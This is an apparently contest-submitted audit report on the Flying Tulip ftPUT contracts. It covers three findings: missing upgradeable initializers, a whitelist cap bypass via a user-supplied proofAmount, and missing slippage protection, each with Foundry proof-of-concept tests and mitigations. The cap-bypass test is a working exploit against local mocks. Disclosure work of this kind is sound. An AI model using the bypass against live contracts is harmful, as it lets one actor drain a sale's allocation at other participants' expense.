# S-1 Upgradeable Contracts Fail to Initialize Required Parent Modules, Leading to Undefined Behavior

## Summary
The pFT contract fails to call required parent initializers for inherited OpenZeppelin upgradeable modules, specifically:

- UUPSUpgradeable  
- ReentrancyGuardTransientUpgradeable  

This violates OpenZeppelin’s documented requirements for upgradeable contracts and can result in broken safety guarantees and undefined behavior over the protocol’s lifetime.



## Root Cause

**Contract**

`pFT.sol`

**Function**

`initialize(address _putManager)`

```solidity
function initialize(address _putManager) public initializer {  
    __ERC721_init("Flying Tulip PUT", "ftPUT");  
    __ERC721Enumerable_init();  
    // Missing:  
    // __UUPSUpgradeable_init();  
    // __ReentrancyGuardTransient_init();  
    _setPutManager(_putManager);  
}  
```

https://github.com/sherlock-audit/2026-01-flying-tulip/blob/main/ftPUT/contracts/pFT.sol#L91C5-L95C6

The contract inherits multiple upgradeable base contracts that define their own initializer logic, but those initializers are never executed.

From the OpenZeppelin documentation:

> “When using upgradeable contracts, you must call the initializer of each parent contract that defines one. Initializers are not automatically chained like constructors.”

Source:  
https://docs.openzeppelin.com/contracts/5.x/upgradeable#initializers

Additionally, OpenZeppelin source code comments state:

> “⚠️ All inherited contracts with initializers must be initialized.”


## Internal Pre-conditions

- Contract is deployed behind a proxy  
- Reentrancy protection is relied upon  
- Future upgrades are expected  


## External Pre-conditions

- None  


## Attack Path

The following may occurs due to missing initialization -

### Scenario 1: Reentrancy guard malfunction

- ReentrancyGuardTransientUpgradeable relies on proper initialization of its internal state  
- The guard’s storage is never initialized  
- In future upgrades introducing reentrancy-sensitive logic, protection may fail or behave inconsistently  

### Scenario 2: Upgrade safety failure

- UUPSUpgradeable internal assumptions are violated  
- A future upgrade may revert, corrupt storage, or brick the proxy  
- Recovery may be impossible without redeployment  


## Impact

Missing initializers undermine foundational safety assumptions of the protocol.  

Reentrancy protections may not reliably prevent reentrant execution in current/future versions, exposing critical state-modifying logic to exploitation.  

Improper UUPS initialization can compromise upgrade integrity, potentially rendering the proxy non-upgradeable or permanently unusable.  

These failures affect the protocol at a systemic level  


## PoC

- Create a file test_Initialization.t.sol at ftPUT/test folder and paste the following code -

```solidity
// SPDX-License-Identifier: UNLICENSED  
pragma solidity ^0.8.30;  
  
import {Test, console} from "forge-std/Test.sol";  
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";  
  
import {pFT} from "contracts/pFT.sol";  
  
contract PoC_MissingInitializers is Test {  
    pFT pft;  
  
    function test_MissingParentInitializers() public {  
        console.log("Deploying pFT implementation...");  
        pFT impl = new pFT();  
  
        console.log("Deploying ERC1967 proxy pointing to implementation...");  
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), "");  
        pft = pFT(address(proxy));  
  
        console.log("Calling pFT.initialize() via proxy...");  
        pft.initialize(address(this));  
  
        console.log("Initialization completed successfully.");  
  
  
        bytes32 statusSlot =  
            bytes32(uint256(keccak256("openzeppelin.reentrancy.transient.status")) - 1);  
  
        bytes32 status;  
        assembly {  
            status := sload(statusSlot)  
        }  
  
        console.log("ReentrancyGuardTransient status slot value:");  
        console.logBytes32(status);  
  
        // Guard is uninitialized (zero), violating OZ assumptions  
        assertEq(status, bytes32(0));  
  
  
        console.log("UUPSUpgradeable initializer was never executed.");  
        console.log("pFT is left in a structurally unsafe upgrade state.");  
    }  
} 
``` 
  
- Run command
```bash
forge test --mt test_MissingParentInitializers -vv 
``` 
- Expected Outcomes

```solidity

 [PASS] test_MissingParentInitializers() (gas: 3930975)  
Logs:  
  Deploying pFT implementation...  
  Deploying ERC1967 proxy pointing to implementation...  
  Calling pFT.initialize() via proxy...  
  Initialization completed successfully.  
  ReentrancyGuardTransient status slot value:  
  0x0000000000000000000000000000000000000000000000000000000000000000  
  UUPSUpgradeable initializer was never executed.  
  pFT is left in a structurally unsafe upgrade state. 

```


## Mitigation

Explicitly initialize all parent contracts:

```solidity
function initialize(address _putManager) public initializer {  
    __ERC721_init("Flying Tulip PUT", "ftPUT");  
    __ERC721Enumerable_init();  
    __UUPSUpgradeable_init();  
    __ReentrancyGuardTransient_init();  
    _setPutManager(_putManager);  
}  
```

---

# S-2 ftACL Allocation Caps Can Be Completely Bypassed by User-Controlled proofAmount

## Summary
The allocation-limiting mechanism implemented through ftACL can be completely bypassed because the maximum allowed investment amount (proofAmount) is fully user-supplied and not cryptographically bound to the Merkle proof.

As a result, any whitelisted user—especially those whitelisted with a permissive leaf such as (user, address(0), 0)—can arbitrarily inflate proofAmount and invest unlimited collateral, bypassing all intended caps and risk controls enforced during the sale.

This breaks a core protocol invariant: that whitelist-based caps meaningfully restrict how much FT can be allocated to a participant.


## Root Cause

**Contracts involved**

- PutManager.sol  
- ftACL.sol  

**Functions involved**

- PutManager.invest(...)  
- ftACL.invest(...)  

### Explanation

The whitelist system relies on Merkle proofs to define who can invest and how much they are allowed to invest. However:

- The Merkle proof is only used to validate membership, not the cap.  
- The cap (proofAmount) is passed as a raw function argument.  
- The contract never verifies that proofAmount matches the amount encoded in the Merkle leaf.  

**Relevant code:**

```solidity
// PutManager.sol  
if (address(ftACL) != address(0) && proofAmount != 0) {  
    ftACL.invest(msg.sender, token, amount, proofAmount);  
}  
```

https://github.com/sherlock-audit/2026-01-flying-tulip/blob/main/ftPUT/contracts/PutManager.sol#L353C2-L374C5

```solidity
// ftACL.sol  
function invest(  
    address account,  
    address token,  
    uint256 amount,  
    uint256 proofAmount  
) external onlyPutManager {  
    uint256 newInvestedAmount = amountInvested[account][token] + amount;  
    if (newInvestedAmount > proofAmount) {  
        revert ftACLCapReached();  
    }  
    amountInvested[account][token] = newInvestedAmount;  
}  
```

https://github.com/sherlock-audit/2026-01-flying-tulip/blob/main/ftPUT/contracts/ftACL.sol#L86C4-L101C6

The protocol assumes proofAmount is trustworthy, but it is never validated against the Merkle proof.


## Internal Pre-conditions

- ftACL is enabled in PutManager  
- The user is whitelisted under any valid Merkle leaf (including permissive ones)  
- Sale is active  


## External Pre-conditions

- None  


## Attack Path

The attack path can be visualized as -

- Attacker is whitelisted with a Merkle leaf such as (attacker, address(0), 0)  
- Attacker calls PutManager.invest() with a large amount (e.g., 1,000,000 USDC).  
- Attacker supplies proofAmount = large amount.  
- PutManager forwards the call to ftACL.invest() without validating proofAmount.  
- ftACL compares the invested amount against the inflated proofAmount, which never triggers the cap check.  
- Investment succeeds, minting FT without restriction.  
- Attacker repeats the process indefinitely.  

### Example -

**Setup**

- Attacker address: 0xAttacker  
- Token: USDC (6 decimals)  
- Attacker is whitelisted with leaf:

```solidity
keccak256(abi.encode(0xAttacker, address(0), 0))  
```

Meaning: any token, any amount  

**Step 1: Craft malicious investment call**

```solidity
putManager.invest(  
    USDC,  
    1_000_000e6,                // 1,000,000 USDC  
    1_000_000_000e18,          // proofAmount (fake cap)  
    proof                        // valid Merkle proof  
);  
```

**Step 2: PutManager logic**

- proofAmount != 0 → ACL enforcement path is taken  
- No validation of proofAmount against Merkle leaf  
- Call forwarded to ftACL.invest  

**Step 3: ftACL cap check**

```solidity
newInvestedAmount = previous + 1_000_000e6;  
require(newInvestedAmount <= 1_000_000_000e18 ); //  true  
```

Cap check never triggers. Investment succeeds.

**Step 4: Repeat indefinitely**

The attacker can repeat this call to mint unlimited FT without restriction.


## Impact

This vulnerability completely nullifies the protocol’s primary sale-phase risk controls. Allocation caps are intended to limit

- Concentration risk  
- Uncontrolled exposure to FT tokens per participant.  

A single actor can accumulate an outsized share of FT supply, fundamentally distorting token distribution.  

Other Users can suffer a direct, measurable loss of value without any oracle manipulation or admin error.  

As a consequence, the protocol may become excessively exposed to a single participant’s actions, increasing systemic risk.  

Thus the issue satisfies Sherlock’s criteria "if a user input could result in a major protocol malfunction or significant loss of funds for other parties (protocol or other users) it could be a valid high.":


## PoC

- Paste the following test file in test folder.

```solidity
// SPDX-License-Identifier: UNLICENSED  
pragma solidity ^0.8.30;  
  
import {Test, console} from "forge-std/Test.sol";  
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";  
  
import {PutManager} from "contracts/PutManager.sol";  
import {pFT} from "contracts/pFT.sol";  
import {ftACL} from "contracts/ftACL.sol";  
import {ftYieldWrapper} from "contracts/ftYieldWrapper.sol";  
  
import {MockERC20} from "test/mocks/MockERC20.sol";  
import {MockFlyingTulipOracle} from "test/mocks/MockOracles.sol";  
  
contract PoC_ftACL_ProofAmountBypass is Test {  
    PutManager putManager;  
    pFT putToken;  
    ftACL acl;  
    ftYieldWrapper vault;  
  
    MockERC20 ft;  
    MockERC20 usdc;  
    MockFlyingTulipOracle oracle;  
  
    address attacker = address(0xBEEF);  
    address configurator = address(0x123);  
    address msig = address(0x1111);  
  
    function setUp() public {  
        vm.label(attacker, "Attacker");  
        vm.label(configurator, "Configurator");  
        vm.label(msig, "Msig");  
  
          
        ft = new MockERC20("Flying Tulip", "FT", 18);  
        usdc = new MockERC20("USDC", "USDC", 6);  
  
        vm.label(address(ft), "FT");  
        vm.label(address(usdc), "USDC");  
  
       
        oracle = new MockFlyingTulipOracle();  
        oracle.setAssetPrice(address(usdc), 1e8); // $1.00  
  
        vm.label(address(oracle), "Oracle");  
  
        
        pFT pftImpl = new pFT();  
        ERC1967Proxy pftProxy = new ERC1967Proxy(  
            address(pftImpl),  
            abi.encodeCall(pFT.initialize, (address(this))) // temp putManager  
        );  
        putToken = pFT(address(pftProxy));  
        vm.label(address(putToken), "pFT");  
  
       
        PutManager pmImpl = new PutManager(address(ft), address(putToken));  
        ERC1967Proxy pmProxy = new ERC1967Proxy(  
            address(pmImpl),  
            abi.encodeCall(PutManager.initialize, (configurator, msig, address(oracle)))  
        );  
        putManager = PutManager(address(pmProxy));  
        vm.label(address(putManager), "PutManager");  
  
        
        vm.prank(address(this));  
        putToken.setPutManager(address(putManager));  
  
       
        vault = new ftYieldWrapper(  
            address(usdc),  
            address(this), // yieldClaimer  
            address(this), // strategyManager  
            address(this) // treasury  
        );  
        vault.setPutManager(address(putManager));  
        vm.label(address(vault), "Vault");  
  
        
        vm.prank(msig);  
        putManager.addAcceptedCollateral(address(usdc), address(vault));  
  
       
        bytes32 attackerLeaf =  
            keccak256(bytes.concat(keccak256(abi.encode(attacker, address(0), uint256(0)))));  
  
        acl = new ftACL(attackerLeaf, address(putManager));  
        vm.label(address(acl), "ftACL");  
  
        // Set ACL in PutManager  
        vm.prank(msig);  
        putManager.setACL(address(acl));  
  
       
        uint256 ftSupply = 10_000_000_000e18; // 10 billion FT  
        ft.mint(configurator, ftSupply);  
  
        vm.startPrank(configurator);  
        ft.approve(address(putManager), ftSupply);  
        putManager.addFTLiquidity(ftSupply);  
        vm.stopPrank();  
  
       
        usdc.mint(attacker, 2_000_000e6); // 2M USDC  
  
        vm.prank(attacker);  
        usdc.approve(address(putManager), type(uint256).max);  
  
       
        console.log("\n=== SETUP COMPLETE ===");  
        console.log("FT in PutManager:", ft.balanceOf(address(putManager)) / 1e18);  
        console.log("USDC in Attacker:", usdc.balanceOf(attacker) / 1e6);  
        console.log("Sale Enabled:", putManager.saleEnabled());  
        console.log("ACL Configured:", address(putManager.ftACL()));  
        console.log("Merkle Root:", vm.toString(acl.getMerkleRoot()));  
    }  
  
    function test_BypassAllocationCap() public {  
        console.log("\n=== ATTACK BEGINS ===\n");  
   
        // For single-leaf tree, proof is empty  
        bytes32[] memory proof = new bytes32[](0);  
  
        uint256 FAKE_CAP = type(uint256).max;  
        console.log("Attacker claims cap:", FAKE_CAP);  
  
      
        console.log("\n--- Investment 1 ---");  
  
        uint256 balanceBefore1 = usdc.balanceOf(attacker);  
  
        vm.prank(attacker);  
        uint256 nftId1 = putManager.invest(  
            address(usdc),  
            500_000e6, // 500k USDC  
            FAKE_CAP, // User-controlled "cap"  
            proof  
        );  
  
        uint256 balanceAfter1 = usdc.balanceOf(attacker);  
        uint256 invested1 = acl.amountInvested(attacker, address(usdc));  
  
        console.log("NFT ID:", nftId1);  
        console.log("USDC spent:", (balanceBefore1 - balanceAfter1) / 1e6);  
        console.log("Total invested:", invested1 / 1e6);  
        console.log("Investment 1 succeeded");  
  
     
        console.log("\n--- Investment 2 ---");  
  
        uint256 balanceBefore2 = usdc.balanceOf(attacker);  
  
        vm.prank(attacker);  
        uint256 nftId2 = putManager.invest(  
            address(usdc),  
            500_000e6, // Another 500k USDC  
            FAKE_CAP, // Same fake cap  
            proof  
        );  
  
        uint256 balanceAfter2 = usdc.balanceOf(attacker);  
        uint256 invested2 = acl.amountInvested(attacker, address(usdc));  
  
        console.log("NFT ID:", nftId2);  
        console.log("USDC spent:", (balanceBefore2 - balanceAfter2) / 1e6);  
        console.log("Total invested:", invested2 / 1e6);  
        console.log("Investment 2 succeeded");  
  
      
        console.log("\n--- Investment 3 ---");  
  
        uint256 balanceBefore3 = usdc.balanceOf(attacker);  
  
        vm.prank(attacker);  
        uint256 nftId3 = putManager.invest(  
            address(usdc),  
            500_000e6, // Another 500k USDC  
            FAKE_CAP, // Same fake cap  
            proof  
        );  
  
        uint256 balanceAfter3 = usdc.balanceOf(attacker);  
        uint256 invested3 = acl.amountInvested(attacker, address(usdc));  
  
        console.log("NFT ID:", nftId3);  
        console.log("USDC spent:", (balanceBefore3 - balanceAfter3) / 1e6);  
        console.log("Total invested:", invested3 / 1e6);  
        console.log("Investment 3 succeeded");  
  
        console.log("\n=== ATTACK COMPLETE ===");  
        console.log("Total USDC Invested:", invested3 / 1e6);  
        console.log("Attacker USDC Remaining:", usdc.balanceOf(attacker) / 1e6);  
  
        (,, uint256 ft1,,,,,,) = putToken.puts(nftId1);  
        (,, uint256 ft2,,,,,,) = putToken.puts(nftId2);  
        (,, uint256 ft3,,,,,,) = putToken.puts(nftId3);  
  
        uint256 totalFT = ft1 + ft2 + ft3;  
  
        console.log("Total FT Received:", totalFT / 1e18);  
        console.log("\nExpected FT (10 FT per $1):", (invested3 * 10) / 1e6);  
  
        
        assertEq(invested3, 1_500_000e6, "Should have invested 1.5M USDC");  
        assertEq(totalFT, 15_000_000e18, "Should have received 15M FT");  
  
      
        console.log("\n=== VULNERABILITY PROOF ===");  
        console.log("Attacker claimed cap:", FAKE_CAP);  
        console.log("Actual invested:     ", invested3);  
        console.log("Cap check would pass:", invested3 <= FAKE_CAP ? "YES" : "NO");  
        console.log("\nConclusion: User-controlled proofAmount bypasses ALL allocation limits");  
    }  
} 
```

- Expected Outcome
  
```solidity
[PASS] test_BypassAllocationCap() (gas: 869255)  
Logs:  
    
=== SETUP COMPLETE ===  
  FT in PutManager: 10000000000  
  USDC in Attacker: 2000000  
  Sale Enabled: true  
  ACL Configured: 0x03A6a84cD762D9707A21605b548aaaB891562aAb  
  Merkle Root: 0x00cee13f5b415369f6054621be52dc3fb6868f7d08085da04185095baac13e4b  
    
=== ATTACK BEGINS ===  
  
  Attacker claims cap: 115792089237316195423570985008687907853269984665640564039457584007913129639935  
    
--- Investment 1 ---  
  NFT ID: 0  
  USDC spent: 500000  
  Total invested: 500000  
  Investment 1 succeeded  
    
--- Investment 2 ---  
  NFT ID: 1  
  USDC spent: 500000  
  Total invested: 1000000  
  Investment 2 succeeded  
    
--- Investment 3 ---  
  NFT ID: 2  
  USDC spent: 500000  
  Total invested: 1500000  
  Investment 3 succeeded  
    
=== ATTACK COMPLETE ===  
  Total USDC Invested: 1500000  
  Attacker USDC Remaining: 500000  
  Total FT Received: 15000000  
    
Expected FT (10 FT per $1): 15000000  
    
=== VULNERABILITY PROOF ===  
  Attacker claimed cap: 115792089237316195423570985008687907853269984665640564039457584007913129639935  
  Actual invested:      1500000000000  
  Cap check would pass: YES  
    
Conclusion: User-controlled proofAmount bypasses ALL allocation limits  
```


## Mitigation

### Option 1

Always enforce ACL when enabled and remove conditional logic:

```solidity
if (address(ftACL) != address(0)) {  
    ftACL.invest(msg.sender, token, amount, proofAmount);  
}  
```

Additionally, ensure proofAmount is validated against the Merkle leaf.

### Option 2

Encode proofAmount inside the Merkle leaf and derive it on-chain, rather than accepting it as a parameter.

--- 

# S-3 Users Have No Slippage Protection When Minting FT via invest()

## Summary
The PutManager.invest() function mints FT based on oracle prices but provides no mechanism for users to specify a minimum acceptable FT output. Users can therefore receive significantly fewer FT tokens than expected if prices change between transaction submission and execution.


## Root Cause

**Contract**

`PutManager.sol`

**Function**

`invest(...)`

```solidity
(uint256 ftOut,,) = getAssetFTPrice(token, amount);  
// No minimum output check  
pFT.mint(recipient, amount, ftOut, ...);  
```

https://github.com/sherlock-audit/2026-01-flying-tulip/blob/main/ftPUT/contracts/PutManager.sol#L323C3-L401C18


## Internal Pre-conditions

- Invest function enabled  
- Oracle price updates occur  


## External Pre-conditions

- Normal market movement  
- No oracle manipulation required  


## Attack Path

- User submits transaction expecting 10,000 FT  
- Before execution, oracle updates pricing  
- Execution result: ftOut = 5,000 FT  
- Transaction succeeds without reverting  


## Impact

Without slippage protection, users can unknowingly suffer material value loss during investment. This weakens user guarantees around pricing, exposes participants to adverse execution outcomes.  

The absence of slippage protection exposes users to silent value loss during normal usage. Over time, repeated unfavorable executions can discourage participation, reduce capital inflows, and harm the protocol’s reputation for fairness and transparency.  

Because invest() is a primary entry point into the system, weakened execution guarantees at this stage can have compounding negative effects on user confidence and long-term adoption.  


## PoC

- Create a file testSlippage.t.sol at ftPUT/test folder and paste the following code.

```solidity
// SPDX-License-Identifier: UNLICENSED  
pragma solidity ^0.8.30;  
  
import {Test, console} from "forge-std/Test.sol";  
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";  
  
import {MockERC20} from "./mocks/MockERC20.sol";  
import {MockFlyingTulipOracle} from "./mocks/MockOracles.sol";  
import {PutManager} from "contracts/PutManager.sol";  
import {pFT} from "contracts/pFT.sol";  
import {ftYieldWrapper} from "contracts/ftYieldWrapper.sol";  
import {MerkleHelper} from "./helpers/MerkleHelper.sol";  
  
contract PoC_NoSlippage is Test {  
    address internal msig = makeAddr("msig");  
    address internal configurator = makeAddr("configurator");  
    address internal investor = makeAddr("investor");  
  
    MockERC20 internal usdc;  
    MockERC20 internal ft;  
    MockFlyingTulipOracle internal oracle;  
  
    PutManager internal manager;  
    pFT internal ftput;  
    ftYieldWrapper internal wrapper;  
  
    function setUp() public {  
        // --- Deploy tokens ---  
        usdc = new MockERC20("USD Coin", "USDC", 6);  
        ft = new MockERC20("Flying Tulip", "FT", 18);  
  
        // --- Deploy oracle ---  
        oracle = new MockFlyingTulipOracle();  
  
        // Initial oracle state: $1 per USDC  
        oracle.setAssetPrice(address(usdc), 1e8); // 1 USD  
  
        // --- Deploy pFT behind proxy ---  
        pFT impl = new pFT();  
        ERC1967Proxy pftProxy = new ERC1967Proxy(address(impl), "");  
        ftput = pFT(address(pftProxy));  
  
        // --- Deploy PutManager behind proxy ---  
        PutManager implManager = new PutManager(address(ft), address(ftput));  
        bytes memory init =  
            abi.encodeWithSelector(PutManager.initialize.selector, configurator, msig, address(oracle));  
        ERC1967Proxy managerProxy = new ERC1967Proxy(address(implManager), init);  
        manager = PutManager(address(managerProxy));  
  
        // Initialize pFT  
        vm.prank(configurator);  
        ftput.initialize(address(manager));  
  
        // --- Deploy wrapper ---  
        wrapper = new ftYieldWrapper(  
            address(usdc),  
            address(this),  
            address(this),  
            address(this)  
        );  
  
        // authorize PutManager   
        wrapper.setPutManager(address(manager));  
  
        // --- Register collateral ---  
        vm.prank(msig);  
        manager.addAcceptedCollateral(address(usdc), address(wrapper));  
  
        vm.prank(configurator);  
        manager.setCollateralCaps(address(usdc), type(uint256).max);  
  
        // --- Fund FT liquidity ---  
        ft.mint(configurator, 1_000_000e18);  
        vm.startPrank(configurator);  
        ft.approve(address(manager), type(uint256).max);  
        manager.addFTLiquidity(500_000e18);  
        vm.stopPrank();  
  
        // --- Fund investor ---  
        usdc.mint(investor, 1_000e6);  
        vm.prank(investor);  
        usdc.approve(address(manager), type(uint256).max);  
    }  
  
    function test_NoSlippageProtection() public {  
        uint256 deposit = 1_000e6; // 1,000 USDC  
  
        // --- Step 1: User queries expected FT output ---  
        (uint256 expectedFt,,) = manager.getAssetFTPrice(address(usdc), deposit);  
  
        console.log("Expected FT at submission time:", expectedFt);  
  
        // --- Step 2: Oracle price updates normally before execution ---  
        // Price drops by 20% (e.g., market movement, rebase, feed update)  
        oracle.setAssetPrice(address(usdc), 8e7); // $0.80  
  
        console.log("Oracle price updated BEFORE invest execution");  
  
        // --- Step 3: User executes invest() ---  
        vm.prank(investor);  
        uint256 id =  
            manager.invest(address(usdc), deposit, 0, MerkleHelper.emptyProof());  
  
        // --- Step 4: Observe actual FT received ---  
        (,, uint256 ftReceived,,,,,,) = ftput.puts(id);  
  
        console.log("FT actually received:", ftReceived);  
  
        // --- Step 5: Demonstrate material loss ---  
        assertLt(  
            ftReceived,  
            expectedFt,  
            "User should receive fewer FT after oracle update"  
        );  
  
        uint256 loss = expectedFt - ftReceived;  
        console.log("FT lost due to slippage:", loss);  
  
        /*  
            Key Observation :  
  
            - The transaction DOES NOT revert  
            - The user has NO WAY to specify a minimum FT output  
            - The loss is silent and final  
            - This occurs during normal protocol usage  
        */  
    }  
} 
``` 
  
- Run command
```bash
forge test --mt test_NoSlippageProtection -vv 
```

- Expected Output
  
```solidity
Ran 1 test for test/testSlippage.sol:PoC_NoSlippage  
[PASS] test_NoSlippageProtection() (gas: 372919)  
Logs:  
  Expected FT at submission time: 10000000000000000000000  
  Oracle price updated BEFORE invest execution  
  FT actually received: 8000000000000000000000  
  FT lost due to slippage: 2000000000000000000000  
  
```

## Mitigation

Add user-controlled slippage protection:

```solidity
require(ftOut >= minFtOut, "Slippage exceeded");  
```
